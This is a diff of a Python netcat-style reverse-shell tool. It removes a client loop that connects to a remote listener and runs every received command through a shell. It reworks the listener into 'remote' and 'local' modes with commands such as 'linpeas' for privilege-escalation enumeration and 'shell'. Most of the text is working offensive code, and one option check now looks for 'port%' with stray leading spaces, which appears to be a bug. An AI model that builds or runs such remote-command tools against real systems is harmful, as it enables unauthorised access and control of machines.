@@ -2,7 +2,6 @@
 from libs.help import Help
 from libs.lhost import Lhost
 from libs.rhost import Rhost
-from colorama import Fore, Back, Style
 import socket
 import sys, os
 import subprocess
@@ -27,9 +26,9 @@ class netcat(object):
                 self.listener = True
 
             elif opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
-                Help.usageOn()
+                Help.usageOff()
 
-            elif "p%" in opt or "port%" in opt:
+            elif "p%" in opt or "   port%" in opt:
                 opts = opt.split("%")
                 self.port = int(opts[1])
 
@@ -41,110 +40,82 @@ class netcat(object):
                 self.clientHandler = True
 
             else:
-                Help.usageOn()
+                Help.usageOff()
 
         if self.listener:
             self.serverLoop()
         if self.clientHandler:
             self.clientLoop()
 
-
-
-
-    def clientLoop(self):
-        global length
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.target,self.port))
-        while True:
-            recv = s.recv(self.bufferSize)
-            recv = recv.decode('utf-8')
-            if 'cd' in recv:
-                recv = recv.split(' ')
-                param = ''.join(recv[1:])
-                try:
-                    os.chdir(param)
-                    s.send(os.getcwd().encode())
-                except:
-                    s.send(b"Error ! ")
-
-            elif "exit" in recv or "quit" in recv:
-                s.close()
-                break
-
-            elif 'whoami' in recv or "pwd" in recv:
-                output = subprocess.getoutput(recv)
-                s.send(output.encode())
-
-            elif "sudo" in recv:
-                print("ok")
-                s.send(b"ko")
-
-            else:
-                #print(recv)
-                #res = self.bash_(recv)
-                #print(res)
-                #s.send(res.encode())
-
-                output = recv+'\n\n'
-                output = subprocess.getoutput(recv)+ '\n'
-                s.send(output.encode())
-
-                #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                #s.send(CMD.stdout.read())
-                #s.send(CMD.stderr.read())
-
     def serverLoop(self):
+        local = False
         conn,addr = Lhost.binding(self.target,self.port)
         print("[+] Connection from : ",addr)
         print("\nType help if you want some tips ! \n")
         while True:
-            home,user,tag = Lhost.init(conn)
-            Lhost.getDir(conn)
-            user = Fore.RED+user
-            command = input('\033[93m'+"%s@[%s] %s "%(user,home,tag) + '\x1b[0m')
-            if 'clear' in command:
-                os.system('clear')
+            if local == False:
+                home,user,tag = Rhost.init(conn)
+                Rhost.getDir(conn)
+                try:
+                    command = input('\033[31m'+"(remote) \x1b[0m\033[93m\033[1m%s\x1b[0m\033[93m@[%s] %s "%(user,home,tag) + '\x1b[0m')
 
-            elif 'exit' in command or 'quit' in command or 'terminate' in command:
-                conn.send(b'exit')
-                conn.close()
-                break
+                    if 'clear' in command:
+                        os.system('clear')
 
-            elif 'help' in command:
-                Help.usageOff()
-
-            elif 'cd' in command:
-                conn.send(command.encode())
-                recv = conn.recv(self.bufferSize).decode()
-                if "Error" in recv:
-                    print("Error")
-                else:
-                    self.home = recv
-
-            elif command == "":
-                print('')
-
-            elif command == "linpeas":
-                self.linpeas(conn)
-
-            elif command == "shell":
-                Rhost.shell(conn)
-                conn.recv(self.bufferSize)
-
-            elif "sudo" in command:
-                print(command)
-                conn.send(command.encode())
+                    elif 'exit' in command or 'quit' in command or 'terminate' in command:
+                        conn.send(b'exit')
+                        conn.close()
+                        break
+                    elif 'cd' in command:
+                        conn.send(command.encode())
+                        recv = conn.recv(self.bufferSize).decode()
+                        if "Error" in recv:
+                            print("Error")
+                        else:
+                            self.home = recv
+                    elif command == "":
+                        print('')
+                    elif command == "local":
+                        local = True
+                        Help.usageOn()
+                    else:
+                        conn.send(command.encode())
+                        fini = "false"
+                        while fini == "false":
+                            recv = conn.recv(self.bufferSize).decode()
+                            print(recv)
+                            if len(recv) < self.bufferSize:
+                                fini = "true"
+                except KeyboardInterrupt:
+                    print('\n')
 
             else:
-                conn.send(command.encode())
-                fini = "false"
-                while fini == "false":
-                    recv = conn.recv(self.bufferSize).decode()
-                    print(recv)
-                    if len(recv) < self.bufferSize:
-                        fini = "true"
-
-
+                home,user,tag = Lhost.init()
+                Lhost.getDir()
+                try:
+                    command = input('\033[31m'+"(local) \x1b[0m\033[93m\033[1m%s\x1b[0m\033[93m@[%s] %s "%(user,home,tag) + '\x1b[0m')
+                    if 'help' in command:
+                        Help.usageOn()
+                    elif command == "linpeas":
+                        Rhost.linpeas(conn)
+                    elif command == "shell":
+                        Rhost.shell(conn)
+                        conn.recv(self.bufferSize).decode()
+                    elif command == "exit":
+                        local = False
+                    elif command == "clear":
+                        os.system("clear")
+                    elif "cd " in command:
+                        param = command.split(' ')
+                        param = ''.join(param[1:])
+                        try:
+                            os.chdir(param)
+                        except:
+                            print("Error !")
+                    else:
+                        os.system(command)
+                except KeyboardInterrupt:
+                    print('\n')
 
 if __name__ == "__main__":
    ncat = netcat()
